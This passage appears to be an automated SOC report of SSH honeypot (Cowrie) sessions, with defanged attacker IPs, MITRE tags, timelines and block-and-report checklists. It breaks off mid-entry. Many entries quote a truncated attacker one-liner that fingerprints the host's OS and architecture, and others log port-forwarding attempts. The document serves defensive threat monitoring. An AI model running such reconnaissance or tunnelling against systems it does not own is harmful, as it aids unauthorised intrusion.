| **Last Seen** | 2026-07-21 20:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:08:34` | `cowrie.session.connect` |
| `2026-07-21 20:08:34` | `cowrie.client.version` |
| `2026-07-21 20:08:34` | `cowrie.client.kex` |
| `2026-07-21 20:08:35` | `cowrie.login.success` |
| `2026-07-21 20:08:36` | `cowrie.session.params` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.success` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:36` | `cowrie.command.input` |
| `2026-07-21 20:08:37` | `cowrie.log.closed` |
| `2026-07-21 20:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af743efb1e1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:10 |
| **Last Seen** | 2026-07-21 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:10:17` | `cowrie.session.connect` |
| `2026-07-21 20:10:17` | `cowrie.client.version` |
| `2026-07-21 20:10:17` | `cowrie.client.kex` |
| `2026-07-21 20:10:18` | `cowrie.login.success` |
| `2026-07-21 20:10:19` | `cowrie.session.params` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.success` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:19` | `cowrie.command.input` |
| `2026-07-21 20:10:20` | `cowrie.log.closed` |
| `2026-07-21 20:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c74d2918c9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:11 |
| **Last Seen** | 2026-07-21 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:11:57` | `cowrie.session.connect` |
| `2026-07-21 20:11:57` | `cowrie.client.version` |
| `2026-07-21 20:11:57` | `cowrie.client.kex` |
| `2026-07-21 20:11:58` | `cowrie.login.success` |
| `2026-07-21 20:11:59` | `cowrie.session.params` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.success` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:11:59` | `cowrie.command.input` |
| `2026-07-21 20:12:00` | `cowrie.log.closed` |
| `2026-07-21 20:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe0d5baf193

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-21 20:12 |
| **Last Seen** | 2026-07-21 20:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:12:59` | `cowrie.session.connect` |
| `2026-07-21 20:12:59` | `cowrie.client.version` |
| `2026-07-21 20:12:59` | `cowrie.client.kex` |
| `2026-07-21 20:13:01` | `cowrie.login.success` |
| `2026-07-21 20:13:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca83180cd6bf

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-07-21 20:13 |
| **Last Seen** | 2026-07-21 20:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:13:11` | `cowrie.session.connect` |
| `2026-07-21 20:13:12` | `cowrie.client.version` |
| `2026-07-21 20:13:12` | `cowrie.client.kex` |
| `2026-07-21 20:13:15` | `cowrie.login.success` |
| `2026-07-21 20:13:15` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8936d00d865c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:13 |
| **Last Seen** | 2026-07-21 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:13:39` | `cowrie.session.connect` |
| `2026-07-21 20:13:39` | `cowrie.client.version` |
| `2026-07-21 20:13:39` | `cowrie.client.kex` |
| `2026-07-21 20:13:40` | `cowrie.login.success` |
| `2026-07-21 20:13:42` | `cowrie.session.params` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.success` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.command.input` |
| `2026-07-21 20:13:42` | `cowrie.log.closed` |
| `2026-07-21 20:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af630c56c0c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:15 |
| **Last Seen** | 2026-07-21 20:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:15:13` | `cowrie.session.connect` |
| `2026-07-21 20:15:13` | `cowrie.client.version` |
| `2026-07-21 20:15:13` | `cowrie.client.kex` |
| `2026-07-21 20:15:16` | `cowrie.login.success` |
| `2026-07-21 20:15:17` | `cowrie.session.params` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.success` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:17` | `cowrie.command.input` |
| `2026-07-21 20:15:18` | `cowrie.log.closed` |
| `2026-07-21 20:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab803afe914

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-07-21 20:16 |
| **Last Seen** | 2026-07-21 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:16:30` | `cowrie.session.connect` |
| `2026-07-21 20:16:31` | `cowrie.client.version` |
| `2026-07-21 20:16:31` | `cowrie.client.kex` |
| `2026-07-21 20:16:33` | `cowrie.login.success` |
| `2026-07-21 20:16:34` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a38f5e9366

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-21 20:16 |
| **Last Seen** | 2026-07-21 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:16:39` | `cowrie.session.connect` |
| `2026-07-21 20:16:40` | `cowrie.client.version` |
| `2026-07-21 20:16:40` | `cowrie.client.kex` |
| `2026-07-21 20:16:42` | `cowrie.login.success` |
| `2026-07-21 20:16:43` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186b27c50ab3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:16 |
| **Last Seen** | 2026-07-21 20:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:16:42` | `cowrie.session.connect` |
| `2026-07-21 20:16:42` | `cowrie.client.version` |
| `2026-07-21 20:16:42` | `cowrie.client.kex` |
| `2026-07-21 20:16:44` | `cowrie.login.success` |
| `2026-07-21 20:16:45` | `cowrie.session.params` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.success` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:45` | `cowrie.command.input` |
| `2026-07-21 20:16:46` | `cowrie.log.closed` |
| `2026-07-21 20:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea98f2b518a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:18 |
| **Last Seen** | 2026-07-21 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:18:10` | `cowrie.session.connect` |
| `2026-07-21 20:18:10` | `cowrie.client.version` |
| `2026-07-21 20:18:10` | `cowrie.client.kex` |
| `2026-07-21 20:18:12` | `cowrie.login.success` |
| `2026-07-21 20:18:14` | `cowrie.session.params` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.success` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:14` | `cowrie.command.input` |
| `2026-07-21 20:18:15` | `cowrie.log.closed` |
| `2026-07-21 20:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a38577c5546

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-21 20:19 |
| **Last Seen** | 2026-07-21 20:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:19:45` | `cowrie.session.connect` |
| `2026-07-21 20:19:45` | `cowrie.client.version` |
| `2026-07-21 20:19:45` | `cowrie.client.kex` |
| `2026-07-21 20:19:47` | `cowrie.login.success` |
| `2026-07-21 20:19:49` | `cowrie.session.params` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.success` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.command.input` |
| `2026-07-21 20:19:49` | `cowrie.log.closed` |
| `2026-07-21 20:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5296d5bd9335

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 20:20 |
| **Last Seen** | 2026-07-21 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:20:35` | `cowrie.session.connect` |
| `2026-07-21 20:20:35` | `cowrie.client.version` |
| `2026-07-21 20:20:35` | `cowrie.client.kex` |
| `2026-07-21 20:20:35` | `cowrie.login.success` |
| `2026-07-21 20:20:36` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:20:36` | `cowrie.direct-tcpip.data` |
| `2026-07-21 20:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff6fa6156f9

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-21 20:21 |
| **Last Seen** | 2026-07-21 20:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:21:40` | `cowrie.session.connect` |
| `2026-07-21 20:21:40` | `cowrie.client.version` |
| `2026-07-21 20:21:40` | `cowrie.client.kex` |
| `2026-07-21 20:21:42` | `cowrie.login.success` |
| `2026-07-21 20:21:43` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246968da33f4

| Field | Detail |
|---|---|
| **Source IP** | `211.43.139[.]142` |
| **First Seen** | 2026-07-21 20:21 |
| **Last Seen** | 2026-07-21 20:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:21:53` | `cowrie.session.connect` |
| `2026-07-21 20:21:53` | `cowrie.client.version` |
| `2026-07-21 20:21:53` | `cowrie.client.kex` |
| `2026-07-21 20:21:55` | `cowrie.login.success` |
| `2026-07-21 20:21:56` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.43.139[.]142` to AbuseIPDB if not already reported
- [ ] Block `211.43.139[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246efd1341da

| Field | Detail |
|---|---|
| **Source IP** | `60.175.91[.]53` |
| **First Seen** | 2026-07-21 20:27 |
| **Last Seen** | 2026-07-21 20:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:27:20` | `cowrie.session.connect` |
| `2026-07-21 20:27:20` | `cowrie.client.version` |
| `2026-07-21 20:27:20` | `cowrie.client.kex` |
| `2026-07-21 20:27:22` | `cowrie.login.success` |
| `2026-07-21 20:27:23` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.175.91[.]53` to AbuseIPDB if not already reported
- [ ] Block `60.175.91[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012fa8b0d3b6

| Field | Detail |
|---|---|
| **Source IP** | `41.224.62[.]206` |
| **First Seen** | 2026-07-21 20:27 |
| **Last Seen** | 2026-07-21 20:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:27:28` | `cowrie.session.connect` |
| `2026-07-21 20:27:28` | `cowrie.client.version` |
| `2026-07-21 20:27:28` | `cowrie.client.kex` |
| `2026-07-21 20:27:29` | `cowrie.login.success` |
| `2026-07-21 20:27:29` | `cowrie.direct-tcpip.request` |
